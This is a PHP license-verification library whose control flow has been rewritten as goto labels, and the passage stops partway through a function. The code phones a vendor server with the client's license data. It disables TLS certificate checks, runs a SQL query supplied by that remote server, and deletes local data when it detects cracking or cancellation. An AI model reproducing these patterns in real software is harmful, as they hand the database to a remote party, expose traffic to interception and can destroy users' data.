<?php

function aplCustomEncrypt($string, $key){
	$encrypted_string = null;
	if (!(!empty($string) && !empty($key))) {
		goto S63si;
	}
	$iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length("aes-256-cbc"));
	$encrypted_string = openssl_encrypt($string, "aes-256-cbc", $key, 0, $iv);
	$encrypted_string = base64_encode($encrypted_string . "::" . $iv);
	S63si:
	return $encrypted_string;
}

function aplCustomDecrypt($string, $key){
	$decrypted_string = null;
	if (!(!empty($string) && !empty($key))) {
		goto qzuUq;
	}
	$string = base64_decode($string);
	if (!stristr($string, "::")) {
		goto BXHzE;
	}
	$string_iv_array = explode("::", $string, 2);
	if (!(!empty($string_iv_array) && count($string_iv_array) == 2)) {
		goto wv_zF;
	}
	list($encrypted_string, $iv) = $string_iv_array;
	$decrypted_string = openssl_decrypt($encrypted_string, "aes-256-cbc", $key, 0, $iv);
	wv_zF: BXHzE: qzuUq:
	return $decrypted_string;
}

function aplValidateIntegerValue($number, $min_value = 0, $max_value = INF){
	$result = false;
	if (!(!is_float($number) && filter_var($number, FILTER_VALIDATE_INT, array("options" => array("min_range" => $min_value, "max_range" => $max_value))) !== false)) {
		goto zTg1G;
	}
	$result = true;
	zTg1G:
	return $result;
}

function aplValidateRawDomain($url){
	$result = false;
	if (empty($url)) {
		goto u0qNg;
	}
	if (preg_match("/^[a-z0-9-.]+\.[a-z\.]{2,7}$/", strtolower($url))) {
		goto trfAc;
	}
	$result = false;
	goto S0efi;
	trfAc:
	$result = true;
	S0efi: u0qNg:
	return $result;
}

function aplGetCurrentUrl($remove_last_slash = null){
	$protocol = "http";
	$host = null;
	$script = null;
	$params = null;
	$current_url = null;
	if (!(isset($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] !== "off" || isset($_SERVER["HTTP_X_FORWARDED_PROTO"]) && $_SERVER["HTTP_X_FORWARDED_PROTO"] == "https")) {
		goto Pj3tU;
	}
	$protocol = "https";
	Pj3tU:
	if (!isset($_SERVER["HTTP_HOST"])) {
		goto Hr2Lz;
	}
	$host = $_SERVER["HTTP_HOST"];
	Hr2Lz:
	if (!isset($_SERVER["SCRIPT_NAME"])) {
		goto CThwZ;
	}
	$script = $_SERVER["SCRIPT_NAME"];
	CThwZ:
	if (!isset($_SERVER["QUERY_STRING"])) {
		goto aQ85M;
	}
	$params = $_SERVER["QUERY_STRING"];
	aQ85M:
	if (!(!empty($protocol) && !empty($host) && !empty($script))) {
		goto D2Xrk;
	}
	$current_url = $protocol . "://" . $host . $script;
	if (empty($params)) {
		goto Yc_nK;
	}
	$current_url .= "?" . $params;
	Yc_nK:
	if (!($remove_last_slash == 1)) {
		goto SW1My;
	}
	cfXwB:
	if (!(substr($current_url, -1) == "/")) {
		goto w130d;
	}
	$current_url = substr($current_url, 0, -1);
	goto cfXwB;
	w130d: SW1My: D2Xrk:
	return $current_url;
}

function aplGetRawDomain($url){
	$raw_domain = null;
	if (empty($url)) {
		goto yNtoz;
	}
	$url_array = parse_url($url);
	if (!empty($url_array["scheme"])) {
		goto dtfMX;
	}
	$url = "http://" . $url;
	$url_array = parse_url($url);
	dtfMX:
	if (empty($url_array["host"])) {
		goto EeOZH;
	}
	$raw_domain = $url_array["host"];
	$raw_domain = trim(str_ireplace("www.", '', filter_var($raw_domain, FILTER_SANITIZE_URL)));
	EeOZH: yNtoz:
	return $raw_domain;
}

function aplGetRootUrl($url, $remove_scheme, $remove_www, $remove_path, $remove_last_slash){
	if (!filter_var($url, FILTER_VALIDATE_URL)) {
		goto PvrUf;
	}
	$url_array = parse_url($url);
	$url = str_ireplace($url_array["scheme"] . "://", '', $url);
	if ($remove_path == 1) {
		goto y13qK;
	}
	$last_slash_position = strripos($url, "/");
	if (!($last_slash_position > 0)) {
		goto a49hE;
	}
	$url = substr($url, 0, $last_slash_position + 1);
	a49hE:
	goto qDKL2;
	y13qK:
	$first_slash_position = stripos($url, "/");
	if (!($first_slash_position > 0)) {
		goto k8PdA;
	}
	$url = substr($url, 0, $first_slash_position + 1);
	k8PdA: qDKL2:
	if (!($remove_scheme != 1)) {
		goto P0kII;
	}
	$url = $url_array["scheme"] . "://" . $url;
	P0kII:
	if (!($remove_www == 1)) {
		goto w3O0f;
	}
	$url = str_ireplace("www.", '', $url);
	w3O0f:
	if (!($remove_last_slash == 1)) {
		goto dtFnH;
	}
	pdYe7:
	if (!(substr($url, -1) == "/")) {
		goto HKTF5;
	}
	$url = substr($url, 0, -1);
	goto pdYe7;
	HKTF5: dtFnH: PvrUf:
	return trim($url);
}

function aplCustomPost($url, $post_info = null, $refer = null){
	$user_agent = "phpmillion cURL";
	$connect_timeout = 10;
	$server_response_array = array();
	$formatted_headers_array = array();
	if (!(filter_var($url, FILTER_VALIDATE_URL) && !empty($post_info))) {
		goto e1XdA;
	}
	if (!(empty($refer) || !filter_var($refer, FILTER_VALIDATE_URL))) {
		goto POYtU;
	}
	$refer = $url;
	POYtU:
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $connect_timeout);
	curl_setopt($ch, CURLOPT_TIMEOUT, $connect_timeout);
	curl_setopt($ch, CURLOPT_REFERER, $refer);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $post_info);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_MAXREDIRS, 10);
	curl_setopt($ch, CURLOPT_HEADERFUNCTION, function ($curl, $header) use (&$formatted_headers_array){
		$len = strlen($header);
		$header = explode(":", $header, 2);
		if (!(count($header) < 2)) {
			goto QKR3P;
		}
		return $len;
		QKR3P:
		$name = strtolower(trim($header[0]));
		$formatted_headers_array[$name] = trim($header[1]);
		return $len;
	});
	$result = curl_exec($ch);
	$curl_error = curl_error($ch);
	curl_close($ch);
	$server_response_array["headers"] = $formatted_headers_array;
	$server_response_array["error"] = $curl_error;
	$server_response_array["body"] = $result;
	e1XdA:
	return $server_response_array;
}

function aplVerifyDateTime($datetime, $format){
	$result = false;
	if (!(!empty($datetime) && !empty($format))) {
		goto BBJso;
	}
	$datetime = DateTime::createFromFormat($format, $datetime);
	$errors = DateTime::getLastErrors();
	if (!($datetime && empty($errors["warning_count"]))) {
		goto A4FrS;
	}
	$result = true;
	A4FrS: BBJso:
	return $result;
}

function aplGetDaysBetweenDates($date_from, $date_to){
	$number_of_days = 0;
	if (!(aplVerifyDateTime($date_from, "Y-m-d") && aplVerifyDateTime($date_to, "Y-m-d"))) {
		goto qk6aN;
	}
	$date_to = new DateTime($date_to);
	$date_from = new DateTime($date_from);
	$number_of_days = $date_from->diff($date_to)->format("%a");
	qk6aN:
	return $number_of_days;
}

function aplParseXmlTags($content, $tag_name){
	$parsed_value = null;
	if (!(!empty($content) && !empty($tag_name))) {
		goto svmlA;
	}
	preg_match_all("/<" . preg_quote($tag_name, "/") . ">(.*?)<\/" . preg_quote($tag_name, "/") . ">/ims", $content, $output_array, PREG_SET_ORDER);
	if (empty($output_array[0][1])) {
		goto i59mr;
	}
	$parsed_value = trim($output_array[0][1]);
	i59mr: svmlA:
	return $parsed_value;
}

function aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE){
	$notifications_array = array();
	if (!empty($content_array)) {
		goto gCSfn;
	}
	$notifications_array["notification_case"] = "notification_no_connection";
	$notifications_array["notification_text"] = APL_NOTIFICATION_NO_CONNECTION;
	goto nvRje;
	gCSfn:
	if (!empty($content_array["headers"]["notification_server_signature"]) && aplVerifyServerSignature($content_array["headers"]["notification_server_signature"], $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE)) {
		goto evkvm;
	}
	$notifications_array["notification_case"] = "notification_invalid_response";
	$notifications_array["notification_text"] = APL_NOTIFICATION_INVALID_RESPONSE;
	goto jSxwY;
	evkvm:
	$notifications_array["notification_case"] = $content_array["headers"]["notification_case"];
	$notifications_array["notification_text"] = $content_array["headers"]["notification_text"];
	if (empty($content_array["headers"]["notification_data"])) {
		goto C_lg3;
	}
	$notifications_array["notification_data"] = json_decode($content_array["headers"]["notification_data"], true);
	C_lg3: jSxwY: nvRje:
	return $notifications_array;
}

function aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE){
	$script_signature = null;
	$root_ips_array = gethostbynamel(aplGetRawDomain(APL_ROOT_URL));
	if (!(!empty($ROOT_URL) && isset($CLIENT_EMAIL) && isset($LICENSE_CODE) && !empty($root_ips_array))) {
		goto laMQR;
	}
	$script_signature = hash("sha256", gmdate("Y-m-d") . $ROOT_URL . $CLIENT_EMAIL . $LICENSE_CODE . APL_PRODUCT_ID . implode('', $root_ips_array));
	laMQR:
	return $script_signature;
}

function aplVerifyServerSignature($notification_server_signature, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE){
	$result = false;
	$root_ips_array = gethostbynamel(aplGetRawDomain(APL_ROOT_URL));
	if (!(!empty($notification_server_signature) && !empty($ROOT_URL) && isset($CLIENT_EMAIL) && isset($LICENSE_CODE) && !empty($root_ips_array))) {
		goto ruE2J;
	}
	if (!(hash("sha256", implode('', $root_ips_array) . APL_PRODUCT_ID . $LICENSE_CODE . $CLIENT_EMAIL . $ROOT_URL . gmdate("Y-m-d")) == $notification_server_signature)) {
		goto Fd4PH;
	}
	$result = true;
	Fd4PH: ruE2J:
	return $result;
}

function aplCheckSettings(){
	$notifications_array = array();
	if (!(empty(APL_SALT) || APL_SALT == "some_random_text")) {
		goto ITLJK;
	}
	$notifications_array[] = APL_CORE_NOTIFICATION_INVALID_SALT;
	ITLJK:
	if (!(!filter_var(APL_ROOT_URL, FILTER_VALIDATE_URL) || !ctype_alnum(substr(APL_ROOT_URL, -1)))) {
		goto tLaRE;
	}
	$notifications_array[] = APL_CORE_NOTIFICATION_INVALID_ROOT_URL;
	tLaRE:
	if (filter_var(APL_PRODUCT_ID, FILTER_VALIDATE_INT)) {
		goto HkWFF;
	}
	$notifications_array[] = APL_CORE_NOTIFICATION_INVALID_PRODUCT_ID;
	HkWFF:
	if (aplValidateIntegerValue(APL_DAYS, 1, 365)) {
		goto TZApQ;
	}
	$notifications_array[] = APL_CORE_NOTIFICATION_INVALID_VERIFICATION_PERIOD;
	TZApQ:
	if (!(APL_STORAGE != "DATABASE" && APL_STORAGE != "FILE")) {
		goto aINqD;
	}
	$notifications_array[] = APL_CORE_NOTIFICATION_INVALID_STORAGE;
	aINqD:
	if (!(APL_STORAGE == "DATABASE" && !ctype_alnum(str_ireplace(array("_"), '', APL_DATABASE_TABLE)))) {
		goto nxc1j;
	}
	$notifications_array[] = APL_CORE_NOTIFICATION_INVALID_TABLE;
	nxc1j:
	if (!(APL_STORAGE == "FILE" && !@is_writable(APL_DIRECTORY . "/" . APL_LICENSE_FILE_LOCATION))) {
		goto XvpSG;
	}
	$notifications_array[] = APL_CORE_NOTIFICATION_INVALID_LICENSE_FILE;
	XvpSG:
	if (!(!empty(APL_ROOT_IP) && !filter_var(APL_ROOT_IP, FILTER_VALIDATE_IP))) {
		goto XOVFC;
	}
	$notifications_array[] = APL_CORE_NOTIFICATION_INVALID_ROOT_IP;
	XOVFC:
	if (!(!empty(APL_ROOT_IP) && !in_array(APL_ROOT_IP, gethostbynamel(aplGetRawDomain(APL_ROOT_URL))))) {
		goto dbKBw;
	}
	$notifications_array[] = APL_CORE_NOTIFICATION_INVALID_DNS;
	dbKBw:
	if (!(defined("APL_ROOT_NAMESERVERS") && !empty(APL_ROOT_NAMESERVERS))) {
		goto VzGCw;
	}
	foreach (APL_ROOT_NAMESERVERS as $nameserver) {
		if (aplValidateRawDomain($nameserver)) {
			goto E0iU4;
		}
		$notifications_array[] = APL_CORE_NOTIFICATION_INVALID_ROOT_NAMESERVERS;
		goto VH6sd;
		E0iU4: Ishfd:
	}
	VH6sd: VzGCw:
	if (!(defined("APL_ROOT_NAMESERVERS") && !empty(APL_ROOT_NAMESERVERS))) {
		goto ejMOb;
	}
	$apl_root_nameservers_array = APL_ROOT_NAMESERVERS;
	$fetched_nameservers_array = array();
	$dns_records_array = dns_get_record(aplGetRawDomain(APL_ROOT_URL), DNS_NS);
	foreach ($dns_records_array as $record) {
		$fetched_nameservers_array[] = $record["target"];
		hXqPs:
	}
	lAYeT:
	$apl_root_nameservers_array = array_map("strtolower", $apl_root_nameservers_array);
	$fetched_nameservers_array = array_map("strtolower", $fetched_nameservers_array);
	sort($apl_root_nameservers_array);
	sort($fetched_nameservers_array);
	if (!($apl_root_nameservers_array != $fetched_nameservers_array)) {
		goto V0t3a;
	}
	$notifications_array[] = APL_CORE_NOTIFICATION_INVALID_DNS;
	V0t3a: ejMOb:
	return $notifications_array;
}

function aplParseLicenseFile(){
	$license_data_array = array();
	if (!@is_readable(APL_DIRECTORY . "/" . APL_LICENSE_FILE_LOCATION)) {
		goto rnFbl;
	}
	$file_content = file_get_contents(APL_DIRECTORY . "/" . APL_LICENSE_FILE_LOCATION);
	preg_match_all("/<([A-Z_]+)>(.*?)<\/([A-Z_]+)>/", $file_content, $matches, PREG_SET_ORDER);
	if (empty($matches)) {
		goto Db7QV;
	}
	foreach ($matches as $value) {
		if (!(!empty($value[1]) && $value[1] == $value[3])) {
			goto nAx7o;
		}
		$license_data_array[$value[1]] = $value[2];
		nAx7o: Z_x4t:
	}
	Y_EfP: Db7QV: rnFbl:
	return $license_data_array;
}

function aplGetLicenseData($MYSQLI_LINK = null){
	$settings_row = array();
	if (!(APL_STORAGE == "DATABASE")) {
		goto CtSfZ;
	}
	$settings_results = @mysqli_query($MYSQLI_LINK, "SELECT * FROM " . APL_DATABASE_TABLE);
	$settings_row = @mysqli_fetch_assoc($settings_results);
	CtSfZ:
	if (!(APL_STORAGE == "FILE")) {
		goto K_der;
	}
	$settings_row = aplParseLicenseFile();
	K_der:
	return $settings_row;
}

function aplCheckConnection(){
	$notifications_array = array();
	$content_array = aplCustomPost(APL_ROOT_URL . "/apl_callbacks/connection_test.php", "product_id=" . rawurlencode(APL_PRODUCT_ID) . "&connection_hash=" . rawurlencode(hash("sha256", "connection_test")));
	if (!empty($content_array)) {
		goto r9PDH;
	}
	$notifications_array["notification_case"] = "notification_no_connection";
	$notifications_array["notification_text"] = APL_NOTIFICATION_NO_CONNECTION;
	goto mhQr_;
	r9PDH:
	if (!($content_array["body"] != "<connection_test>OK</connection_test>")) {
		goto QC6Rv;
	}
	$notifications_array["notification_case"] = "notification_invalid_response";
	$notifications_array["notification_text"] = APL_NOTIFICATION_INVALID_RESPONSE;
	QC6Rv: mhQr_:
	return $notifications_array;
}

function aplCheckData($MYSQLI_LINK = null){
	$error_detected = 0;
	$cracking_detected = 0;
	$data_check_result = false;
	extract(aplGetLicenseData($MYSQLI_LINK));
	if (!(!empty($ROOT_URL) && !empty($INSTALLATION_HASH) && !empty($INSTALLATION_KEY) && !empty($LCD) && !empty($LRD))) {
		goto aNbnm;
	}
	$LCD = aplCustomDecrypt($LCD, APL_SALT . $INSTALLATION_KEY);
	$LRD = aplCustomDecrypt($LRD, APL_SALT . $INSTALLATION_KEY);
	if (!(!filter_var($ROOT_URL, FILTER_VALIDATE_URL) || !ctype_alnum(substr($ROOT_URL, -1)))) {
		goto uTViU;
	}
	$error_detected = 1;
	uTViU:
	if (!(filter_var(aplGetCurrentUrl(), FILTER_VALIDATE_URL) && stristr(aplGetRootUrl(aplGetCurrentUrl(), 1, 1, 0, 1), aplGetRootUrl("{$ROOT_URL}/", 1, 1, 0, 1)) === false)) {
		goto M5Wqq;
	}
	$error_detected = 1;
	M5Wqq:
	if (!(empty($INSTALLATION_HASH) || $INSTALLATION_HASH != hash("sha256", $ROOT_URL . $CLIENT_EMAIL . $LICENSE_CODE))) {
		goto efH8e;
	}
	$error_detected = 1;
	efH8e:
	if (!(empty($INSTALLATION_KEY) || !password_verify($LRD, aplCustomDecrypt($INSTALLATION_KEY, APL_SALT . $ROOT_URL)))) {
		goto HFHuy;
	}
	$error_detected = 1;
	HFHuy:
	if (aplVerifyDateTime($LCD, "Y-m-d")) {
		goto Zaxpa;
	}
	$error_detected = 1;
	Zaxpa:
	if (aplVerifyDateTime($LRD, "Y-m-d")) {
		goto Q_JQI;
	}
	$error_detected = 1;
	Q_JQI:
	if (!(aplVerifyDateTime($LCD, "Y-m-d") && $LCD > date("Y-m-d", strtotime("+1 day")))) {
		goto du5Ia;
	}
	$error_detected = 1;
	$cracking_detected = 1;
	du5Ia:
	if (!(aplVerifyDateTime($LRD, "Y-m-d") && $LRD > date("Y-m-d", strtotime("+1 day")))) {
		goto aK4vu;
	}
	$error_detected = 1;
	$cracking_detected = 1;
	aK4vu:
	if (!(aplVerifyDateTime($LCD, "Y-m-d") && aplVerifyDateTime($LRD, "Y-m-d") && $LCD > $LRD)) {
		goto C9snL;
	}
	$error_detected = 1;
	$cracking_detected = 1;
	C9snL:
	if (!($cracking_detected == 1 && APL_DELETE_CRACKED == "YES")) {
		goto ic0aD;
	}
	aplDeleteData($MYSQLI_LINK);
	ic0aD:
	if (!($error_detected != 1 && $cracking_detected != 1)) {
		goto HOcdG;
	}
	$data_check_result = true;
	HOcdG: aNbnm:
	return $data_check_result;
}

function aplVerifyEnvatoPurchase($LICENSE_CODE = null){
	$notifications_array = array();
	$content_array = aplCustomPost(APL_ROOT_URL . "/apl_callbacks/verify_envato_purchase.php", "product_id=" . rawurlencode(APL_PRODUCT_ID) . "&license_code=" . rawurlencode($LICENSE_CODE) . "&connection_hash=" . rawurlencode(hash("sha256", "verify_envato_purchase")));
	if (!empty($content_array)) {
		goto Pv5Y4;
	}
	$notifications_array["notification_case"] = "notification_no_connection";
	$notifications_array["notification_text"] = APL_NOTIFICATION_NO_CONNECTION;
	goto SaeKp;
	Pv5Y4:
	if (!($content_array["body"] != "<verify_envato_purchase>OK</verify_envato_purchase>")) {
		goto fgMpD;
	}
	$notifications_array["notification_case"] = "notification_invalid_response";
	$notifications_array["notification_text"] = APL_NOTIFICATION_INVALID_RESPONSE;
	fgMpD: SaeKp:
	return $notifications_array;
}

function incevioVerify($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $MYSQLI_LINK = null){
	$notifications_array = array();
	$apl_core_notifications = aplCheckSettings();
	if (empty($apl_core_notifications)) {
		goto hsAnw;
	}
	$notifications_array["notification_case"] = "notification_script_corrupted";
	$notifications_array["notification_text"] = implode("; ", $apl_core_notifications);
	goto scaVE;
	hsAnw:
	if (!empty(aplGetLicenseData($MYSQLI_LINK)) && is_array(aplGetLicenseData($MYSQLI_LINK))) {
		goto nkauR;
	}
	$INSTALLATION_HASH = hash("sha256", $ROOT_URL . $CLIENT_EMAIL . $LICENSE_CODE);
	$post_info = "product_id=" . rawurlencode(APL_PRODUCT_ID) . "&client_email=" . rawurlencode($CLIENT_EMAIL) . "&license_code=" . rawurlencode($LICENSE_CODE) . "&root_url=" . rawurlencode($ROOT_URL) . "&installation_hash=" . rawurlencode($INSTALLATION_HASH) . "&license_signature=" . rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE));
	$content_array = aplCustomPost(APL_ROOT_URL . "/apl_callbacks/license_install.php", $post_info, $ROOT_URL);
	$notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE);
	if (!($notifications_array["notification_case"] == "notification_license_ok")) {
		goto JIYc7;
	}
	$INSTALLATION_KEY = aplCustomEncrypt(password_hash(date("Y-m-d"), PASSWORD_DEFAULT), APL_SALT . $ROOT_URL);
	$LCD = aplCustomEncrypt(date("Y-m-d", strtotime("-" . APL_DAYS . " days")), APL_SALT . $INSTALLATION_KEY);
	$LRD = aplCustomEncrypt(date("Y-m-d"), APL_SALT . $INSTALLATION_KEY);
	if (!(APL_STORAGE == "DATABASE")) {
		goto dLGL7;
	}
	$content_array = aplCustomPost(APL_ROOT_URL . "/apl_callbacks/license_scheme.php", $post_info, $ROOT_URL);
	$notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE);
	if (!(!empty($notifications_array["notification_data"]) && !empty($notifications_array["notification_data"]["scheme_query"]))) {
		goto Vt3Fj;
	}
	$mysql_bad_array = array("%APL_DATABASE_TABLE%", "%ROOT_URL%", "%CLIENT_EMAIL%", "%LICENSE_CODE%", "%LCD%", "%LRD%", "%INSTALLATION_KEY%", "%INSTALLATION_HASH%");
	$mysql_good_array = array(APL_DATABASE_TABLE, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE, $LCD, $LRD, $INSTALLATION_KEY, $INSTALLATION_HASH);
	$license_scheme = str_replace($mysql_bad_array, $mysql_good_array, $notifications_array["notification_data"]["scheme_query"]);
	mysqli_multi_query($MYSQLI_LINK, $license_scheme) or die(mysqli_error($MYSQLI_LINK));
	Vt3Fj: dLGL7:
	if (!(APL_STORAGE == "FILE")) {
		goto uWjT7;
	}
	$handle = @fopen(APL_DIRECTORY . "/" . APL_LICENSE_FILE_LOCATION, "w+");
	$fwrite = @fwrite($handle, "<ROOT_URL>{$ROOT_URL}</ROOT_URL><CLIENT_EMAIL>{$CLIENT_EMAIL}</CLIENT_EMAIL><LICENSE_CODE>{$LICENSE_CODE}</LICENSE_CODE><LCD>{$LCD}</LCD><LRD>{$LRD}</LRD><INSTALLATION_KEY>{$INSTALLATION_KEY}</INSTALLATION_KEY><INSTALLATION_HASH>{$INSTALLATION_HASH}</INSTALLATION_HASH>");
	if (!($fwrite === false)) {
		goto lKsj3;
	}
	echo APL_NOTIFICATION_LICENSE_FILE_WRITE_ERROR;
	exit;
	lKsj3:
	@fclose($handle);
	uWjT7: JIYc7:
	goto tB4bH;
	nkauR:
	$notifications_array["notification_case"] = "notification_already_installed";
	$notifications_array["notification_text"] = APL_NOTIFICATION_SCRIPT_ALREADY_INSTALLED;
	tB4bH: scaVE:
	return $notifications_array;

}

function incevioAutoloadHelpers($MYSQLI_LINK = null, $FORCE_VERIFICATION = 0){
	$notifications_array = array();
	$update_lrd_value = 0;
	$update_lcd_value = 0;
	$updated_records = 0;
	$apl_core_notifications = aplCheckSettings();
	if (empty($apl_core_notifications)) {
		goto yFh54;
	}
	$notifications_array["notification_case"] = "notification_script_corrupted";
	$notifications_array["notification_text"] = implode("; ", $apl_core_notifications);
	goto pE7Ov;
	yFh54:
	if (aplCheckData($MYSQLI_LINK)) {
		goto dicfz;
	}
	$notifications_array["notification_case"] = "notification_license_corrupted";
	$notifications_array["notification_text"] = APL_NOTIFICATION_LICENSE_CORRUPTED;
	goto l5bEv;
	dicfz:
	extract(aplGetLicenseData($MYSQLI_LINK));
	if (aplGetDaysBetweenDates(aplCustomDecrypt($LCD, APL_SALT . $INSTALLATION_KEY), date("Y-m-d")) < APL_DAYS && aplCustomDecrypt($LCD, APL_SALT . $INSTALLATION_KEY) <= date("Y-m-d") && aplCustomDecrypt($LRD, APL_SALT . $INSTALLATION_KEY) <= date("Y-m-d") && $FORCE_VERIFICATION === 0) {
		goto T1qnD;
	}
	$post_info = "product_id=" . rawurlencode(APL_PRODUCT_ID) . "&client_email=" . rawurlencode($CLIENT_EMAIL) . "&license_code=" . rawurlencode($LICENSE_CODE) . "&root_url=" . rawurlencode($ROOT_URL) . "&installation_hash=" . rawurlencode($INSTALLATION_HASH) . "&license_signature=" . rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE));
	$content_array = aplCustomPost(APL_ROOT_URL . "/apl_callbacks/license_verify.php", $post_info, $ROOT_URL);
	$notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE);
	if (!($notifications_array["notification_case"] == "notification_license_ok")) {
		goto ER3L6;
	}
	$update_lcd_value = 1;
	ER3L6:
	if (!($notifications_array["notification_case"] == "notification_license_cancelled" && APL_DELETE_CANCELLED == "YES")) {
		goto h_Iv2;
	}
	aplDeleteData($MYSQLI_LINK);
	h_Iv2:
	goto iCQmt;
	T1qnD:
	$notifications_array["notification_case"] = "notification_license_ok";
	$notifications_array["notification_text"] = APL_NOTIFICATION_BYPASS_VERIFICATION;
	iCQmt:
	if (!(aplCustomDecrypt($LRD, APL_SALT . $INSTALLATION_KEY) < date("Y-m-d"))) {
		goto YxJUR;
	}
	$update_lrd_value = 1;
	YxJUR:
	if (!($update_lrd_value == 1 || $update_lcd_value == 1)) {
		goto n97rJ;
	}
	if ($update_lcd_value == 1) {
		goto FLxyq;
	}
	$LCD = aplCustomDecrypt($LCD, APL_SALT . $INSTALLATION_KEY);
	goto NOGAt;
	FLxyq:
	$LCD = date("Y-m-d");
	NOGAt:
	$INSTALLATION_KEY = aplCustomEncrypt(password_hash(date("Y-m-d"), PASSWORD_DEFAULT), APL_SALT . $ROOT_URL);
	$LCD = aplCustomEncrypt($LCD, APL_SALT . $INSTALLATION_KEY);
	$LRD = aplCustomEncrypt(date("Y-m-d"), APL_SALT . $INSTALLATION_KEY);
	if (!(APL_STORAGE == "DATABASE")) {
		goto VoACx;
	}
	$stmt = mysqli_prepare($MYSQLI_LINK, "UPDATE " . APL_DATABASE_TABLE . " SET LCD=?, LRD=?, INSTALLATION_KEY=?");
	if (!$stmt) {
		goto oDECC;
	}
	mysqli_stmt_bind_param($stmt, "sss", $LCD, $LRD, $INSTALLATION_KEY);
	$exec = mysqli_stmt_execute($stmt);
	$affected_rows = mysqli_stmt_affected_rows($stmt);
	if (!($affected_rows > 0)) {
		goto gtREI;
	}
	$updated_records = $updated_records + $affected_rows;
	gtREI:
	mysqli_stmt_close($stmt);
	oDECC:
	if (!($updated_records < 1)) {
		goto VmHq7;
	}
	echo APL_NOTIFICATION_DATABASE_WRITE_ERROR;
	exit;
	VmHq7: VoACx:
	if (!(APL_STORAGE == "FILE")) {
		goto E2hh9;
	}
	$handle = @fopen(APL_DIRECTORY . "/" . APL_LICENSE_FILE_LOCATION, "w+");
	$fwrite = @fwrite($handle, "<ROOT_URL>{$ROOT_URL}</ROOT_URL><CLIENT_EMAIL>{$CLIENT_EMAIL}</CLIENT_EMAIL><LICENSE_CODE>{$LICENSE_CODE}</LICENSE_CODE><LCD>{$LCD}</LCD><LRD>{$LRD}</LRD><INSTALLATION_KEY>{$INSTALLATION_KEY}</INSTALLATION_KEY><INSTALLATION_HASH>{$INSTALLATION_HASH}</INSTALLATION_HASH>");
	if (!($fwrite === false)) {
		goto G27Fx;
	}

	echo APL_NOTIFICATION_LICENSE_FILE_WRITE_ERROR;
	exit;
	G27Fx:
	@fclose($handle);
	E2hh9: n97rJ: l5bEv: pE7Ov:
	return $notifications_array;
}

function aplVerifySupport($MYSQLI_LINK = null){
	$notifications_array = array();
	$apl_core_notifications = aplCheckSettings();
	if (empty($apl_core_notifications)) {
		goto tPG38;
	}
	$notifications_array["notification_case"] = "notification_script_corrupted";
	$notifications_array["notification_text"] = implode("; ", $apl_core_notifications);
	goto SzPi3;
	tPG38:
	if (aplCheckData($MYSQLI_LINK)) {
		goto IG3Z2;
	}
	$notifications_array["notification_case"] = "notification_license_corrupted";
	$notifications_array["notification_text"] = APL_NOTIFICATION_LICENSE_CORRUPTED;
	goto hZXzE;
	IG3Z2:
	extract(aplGetLicenseData($MYSQLI_LINK));
	$post_info = "product_id=" . rawurlencode(APL_PRODUCT_ID) . "&client_email=" . rawurlencode($CLIENT_EMAIL) . "&license_code=" . rawurlencode($LICENSE_CODE) . "&root_url=" . rawurlencode($ROOT_URL) . "&installation_hash=" . rawurlencode($INSTALLATION_HASH) . "&license_signature=" . rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE));
	$content_array = aplCustomPost(APL_ROOT_URL . "/apl_callbacks/license_support.php", $post_info, $ROOT_URL);
	$notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE);
	hZXzE: SzPi3:
	return $notifications_array;
}

function aplVerifyUpdates($MYSQLI_LINK = null){
	$notifications_array = array();
	$apl_core_notifications = aplCheckSettings();
	if (empty($apl_core_notifications)) {
		goto sC5P_;
	}
	$notifications_array["notification_case"] = "notification_script_corrupted";
	$notifications_array["notification_text"] = implode("; ", $apl_core_notifications);
	goto nqHAt;
	sC5P_:
	if (aplCheckData($MYSQLI_LINK)) {
		goto Yzju2;
	}
	$notifications_array["notification_case"] = "notification_license_corrupted";
	$notifications_array["notification_text"] = APL_NOTIFICATION_LICENSE_CORRUPTED;
	goto dKekB;
	Yzju2:
	extract(aplGetLicenseData($MYSQLI_LINK));
	$post_info = "product_id=" . rawurlencode(APL_PRODUCT_ID) . "&client_email=" . rawurlencode($CLIENT_EMAIL) . "&license_code=" . rawurlencode($LICENSE_CODE) . "&root_url=" . rawurlencode($ROOT_URL) . "&installation_hash=" . rawurlencode($INSTALLATION_HASH) . "&license_signature=" . rawurlencode(aplGenerateScriptSignature($ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE));
	$content_array = aplCustomPost(APL_ROOT_URL . "/apl_callbacks/license_updates.php", $post_info, $ROOT_URL);
	$notifications_array = aplParseServerNotifications($content_array, $ROOT_URL, $CLIENT_EMAIL, $LICENSE_CODE);
	dKekB: nqHAt:
	return $notifications_array;
}

function incevioUpdateLicense($MYSQLI_LINK = null){
	$notifications_array = array();
	$apl_core_notifications = aplCheckSettings();
	if (empty($apl_core_notifications)) {
		goto swrSf;
	}
